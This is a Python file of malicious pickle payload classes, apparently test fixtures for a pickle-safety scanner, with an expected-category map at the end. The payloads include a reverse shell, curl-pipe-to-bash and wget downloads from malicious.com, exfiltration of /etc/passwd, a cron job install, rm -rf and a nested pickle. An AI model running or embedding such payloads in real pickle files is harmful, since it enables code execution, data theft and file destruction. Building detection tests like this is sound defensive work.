# ---------------- Malicious pickle payload classes - Unified Exec Version -----------------


class BasePayload:
    """Base class for all malicious payloads"""

    def get_code(self):
        """Return the malicious code string for injection"""
        raise NotImplementedError("Subclasses must implement get_code()")

    def __reduce__(self):
        """All payloads use exec for consistency"""
        return (exec, (self.get_code(),))


class ExecCmd(BasePayload):
    def get_code(self):
        return "open('/tmp/malicious.txt', 'w').write('HACKED')"


class EvalCmd(BasePayload):
    def get_code(self):
        return "import os; os.system('echo hacked > /tmp/eval_test.txt')"


class SocketConnect(BasePayload):
    """Direct socket connection using socket module"""

    def get_code(self):
        return """
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('1.2.3.4', 4444))
s.close()
"""


class RemoveFileOsRemove(BasePayload):
    """File removal using os.remove()"""

    def get_code(self):
        return "import os; os.remove('/tmp/testfile')"


class RemoveFileOsSystem(BasePayload):
    """File removal using os.system with rm command"""

    def get_code(self):
        return "import os; os.system('rm /tmp/testfile')"


class RemoveFileOsSystemRecursive(BasePayload):
    """Recursive directory removal using rm -rf"""

    def get_code(self):
        return "import os; os.system('rm -rf /tmp/remove_dir')"


class RemoveFileSubprocess(BasePayload):
    """File removal using subprocess.call"""

    def get_code(self):
        return "import subprocess; subprocess.call(['rm', '/tmp/testfile'])"


class RemoveFileSubprocessRun(BasePayload):
    """File removal using subprocess.run"""

    def get_code(self):
        return "import subprocess; subprocess.run(['rm', '/tmp/testfile'])"


class RemoveFileShutilRmtree(BasePayload):
    """Directory removal using shutil.rmtree"""

    def get_code(self):
        return "import shutil; shutil.rmtree('/tmp/malicious_dir')"


class RemoveFileViaEval(BasePayload):
    """File removal using eval with __import__"""

    def get_code(self):
        return "import os; os.remove('/tmp/testfile')"


class RemoveFileDirectOsSystem(BasePayload):
    """Direct os.system call for file removal"""

    def get_code(self):
        return "import os; os.system('rm /tmp/testfile')"


class WriteFile(BasePayload):
    """Malicious file write operation"""

    def get_code(self):
        return "open('/tmp/malicious_write.txt', 'w').write('HACKED')"


class AppendToFile(BasePayload):
    """Append malicious content to existing file"""

    def get_code(self):
        return "open('/tmp/existing_file.txt', 'a').write('\\nMALICIOUS APPEND')"


class ShellCommand(BasePayload):
    """Shell command execution via os.system"""

    def get_code(self):
        return "import os; os.system(\"echo 'HACKED' > /tmp/hacked_shell.txt\")"


class ShellCommandWget(BasePayload):
    """Download malicious content via wget"""

    def get_code(self):
        return (
            "import os; os.system('wget -O /tmp/malware http://malicious.com/payload')"
        )


class ShellCommandCurl(BasePayload):
    """Download and execute via curl"""

    def get_code(self):
        return "import os; os.system('curl -s http://malicious.com/script.sh | bash')"


class NestedPayload(BasePayload):
    """Nested pickle execution:
    Outer payload only unpickles an inner malicious pickle;
    the inner pickle performs the real side effect.
    """

    def get_code(self):
        return """
import pickle

class _Inner:
    def __reduce__(self):
        # Real payload executes only when THIS inner pickle is loaded
        code = "open('/tmp/malicious.txt','w').write('HACKED')"
        return (exec, (code,))

# Build inner malicious pickle bytes at runtime
inner_blob = pickle.dumps(_Inner())

# Outer stage: simply unpickle the inner blob
# (This call triggers the real side effect defined above.)
pickle.loads(inner_blob)
"""


class ChmodFile(BasePayload):
    """Change file permissions"""

    def get_code(self):
        return "import os; os.chmod('/tmp/testfile', 0o777)"


class ChownFile(BasePayload):
    """Change file ownership (if running as root)"""

    def get_code(self):
        return "import os; os.chown('/tmp/testfile', 0, 0)"


class CreateSymlink(BasePayload):
    """Create malicious symlink"""

    def get_code(self):
        return "import os; os.symlink('/etc/passwd', '/tmp/passwd_link')"


class RenameFile(BasePayload):
    """Rename/move file to different location"""

    def get_code(self):
        return "import os; os.rename('/tmp/source', '/tmp/moved_file')"


class ProcessSpawn(BasePayload):
    """Spawn new malicious process"""

    def get_code(self):
        return "import subprocess; subprocess.Popen(['/bin/sh', '-c', 'echo SPAWNED > /tmp/spawned.txt'])"


class DataExfiltration(BasePayload):
    """Simulate data exfiltration"""

    def get_code(self):
        return """
import urllib.request
data = open('/etc/passwd', 'r').read()
urllib.request.urlopen('http://malicious.com/exfil', data.encode())
"""


class ReverseShell(BasePayload):
    """Attempt to create reverse shell"""

    def get_code(self):
        return """
import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('1.2.3.4', 4444))
subprocess.call(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
"""


class CronJobInstall(BasePayload):
    """Install malicious cron job"""

    def get_code(self):
        return (
            "import os; os.system(\"echo '* * * * * /tmp/malicious.sh' | crontab -\")"
        )


class NetworkScan(BasePayload):
    """Network reconnaissance"""

    def get_code(self):
        return "import os; os.system('nmap -sn 192.168.1.0/24 > /tmp/network_scan.txt')"


class SegfaultCtypes(BasePayload):
    """Deliberately trigger a SIGSEGV via ctypes (invalid write to NULL)."""

    def get_code(self):
        return """
import ctypes
# Write 1 byte to address 0 → SIGSEGV
ctypes.memmove(0, b"x", 1)
"""


EXPECTED_CATEGORY = {
    ExecCmd: "file_write",
    EvalCmd: "execution",
    SocketConnect: "network",
    RemoveFileOsRemove: "file_modification",
    RemoveFileOsSystem: "execution",
    RemoveFileOsSystemRecursive: "execution",
    RemoveFileSubprocess: "execution",
    RemoveFileSubprocessRun: "execution",
    RemoveFileShutilRmtree: "file_modification",
    RemoveFileViaEval: "file_modification",
    RemoveFileDirectOsSystem: "execution",
    WriteFile: "file_write",
    AppendToFile: "file_write",
    ShellCommand: "execution",
    ShellCommandWget: "execution",
    ShellCommandCurl: "execution",
    NestedPayload: "file_write",
    ChmodFile: "file_modification",
    ChownFile: "file_modification",
    CreateSymlink: "file_modification",
    RenameFile: "file_modification",
    ProcessSpawn: "execution",
    DataExfiltration: "network",
    ReverseShell: "network",
    CronJobInstall: "execution",
    SegfaultCtypes: "signal",
    NetworkScan: "execution",
}
